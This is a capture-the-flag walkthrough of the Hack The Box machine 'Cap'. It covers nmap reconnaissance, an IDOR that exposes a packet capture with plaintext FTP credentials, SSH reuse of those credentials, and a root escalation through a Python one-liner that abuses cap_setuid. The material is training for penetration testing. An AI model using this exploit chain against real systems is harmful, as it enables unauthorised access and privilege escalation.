# Hack The Box - Cap: Full Walkthrough Write-Up

This document provides a detailed, step-by-step annotation of the entire engagement, following the standard phases of Reconnaissance, Initial Access, and Privilege Escalation.

## Phase 1: Reconnaissance and Enumeration

The initial step involves scanning the target machine to identify open ports, running services, and the versions associated with those services.

| Command | Purpose | Output & Findings | Annotation |
| :--- | :--- | :--- | :--- |
| `nmap -A 10.10.10.245` | Comprehensive scan (aggressive service detection, version detection, OS detection, script scanning) targeting the machine. | 21/tcp (FTP): vsftpd 3.0.3; 22/tcp (SSH): OpenSSH 8.2p1 (Ubuntu); 80/tcp (HTTP): Gunicorn, Title: "Security Dashboard" | Three services are open. The Python/Gunicorn web application on port 80 is the primary focus. |
| `whatweb http://10.10.10.245:80` | Gather deeper web technology details. | Gunicorn, JQuery, Bootstrap. | Confirmed a modern Python web stack is serving the application. |

### 1.1 Web Enumeration & Artifact Discovery

I investigated the running web application, which displayed system artifacts via an ID parameter.

| Command/Action | Purpose | Output & Findings | Annotation |
| :--- | :--- | :--- | :--- |
| Manual Browsing (IDOR Testing) | Inspect the web application's URL parameters (`/capture.php?id=...`) and test for Insecure Direct Object Reference (IDOR). | Manipulating the ID parameter revealed other users' data. Setting ID to 0 exposed a full TCP stream artifact. | An IDOR vulnerability allowed access to sensitive system artifacts, leading to credential discovery. |

## Phase 2: Initial Access (Exploitation)

### 2.1 Credential Harvesting
<img width="1117" height="875" alt="founPASSWd" src="https://github.com/user-attachments/assets/f7e858ba-56ad-413a-b0d3-42f23b6b0e8e" />

Analysis of the sensitive TCP stream artifact led to the discovery of credentials for the FTP service.

| Command/Action | Purpose | Output & Findings | Annotation |
| :--- | :--- | :--- | :--- |
| Analysis of Artifact | Search the raw TCP stream data for plaintext authentication attempts. | Successful login sequence found: USER nathan, PASS Buck3tH4TF0RM3! | Successfully extracted valid credentials for the user `nathan`. |

### 2.2 Gaining a User Shell (Initial Foothold)
<img width="532" height="137" alt="using password to connect tvia ssh" src="https://github.com/user-attachments/assets/70f66505-cce1-4fb1-a13e-0b375b3622ae" />

The harvested credentials were reused to gain a stable shell via SSH.

| Command | Purpose | Output & Findings | Annotation |
| :--- | :--- | :--- | :--- |
| `ssh nathan@10.10.10.245` (Password: Buck3tH4TF0RM3!) | Attempt to gain a stable shell using the harvested credentials. | Successful connection. Prompt: `nathan@cap:~$` | Initial user access secured. The next phase is Privilege Escalation. |

## Phase 3: Privilege Escalation (PE)

The machine name ("Cap") strongly suggests exploiting Linux Capabilities. This vector was confirmed via local enumeration.

### 3.1 Local Enumeration and Capability Check

| Command | Purpose | Output & Findings | Annotation |
| :--- | :--- | :--- | :--- |
| `./linpeas.sh` | Automated local enumeration to identify common privilege escalation vectors. | Reports kernel/sudo exploits (PwnKit, Baron Samedit) and a systemd service using relative paths, but the focus remains on the machine's primary hint. | Provides context for the system environment (Ubuntu 20.04) and potential backup exploits. |
| `getcap -r / 2>/dev/null` | Recursively checks the entire filesystem for binaries with assigned Linux Capabilities. | Output includes: `/usr/bin/python3.8 = cap_setuid,cap_net_bind_service+eip` | CRITICAL FINDING: The Python 3.8 binary has the `cap_setuid` capability, allowing it to change its effective User ID to 0 (root). |

### 3.2 Exploiting cap_setuid to Gain Root

We execute a Python one-liner that leverages the `cap_setuid` privilege to elevate the shell to root access.

| Command | Purpose | Output & Findings | Annotation |
| :--- | :--- | :--- | :--- |
| `/usr/bin/python3.8 -c 'import os; os.setuid(0); os.execv("/bin/bash", ["bash"])'` | Python script to perform two actions: 1. `os.setuid(0)` sets the Effective UID to root. 2. `os.execv("/bin/bash", ["bash"])` executes a new Bash shell with these elevated privileges. | The prompt changes to `root@cap:~#` | Full system compromise achieved by exploiting a Linux Capability misconfiguration. |

### 3.3 Flag Retrieval

| Command | Purpose | Output & Findings | Annotation |
| :--- | :--- | :--- | :--- |
| `cat /root/root.txt` | Read the final proof-of-concept file (the root flag). | [Root Flag Value] | Final objective complete. |
<img width="917" height="587" alt="Final flag" src="https://github.com/user-attachments/assets/e8820084-6011-4882-81b5-df577d1e8bc8" />

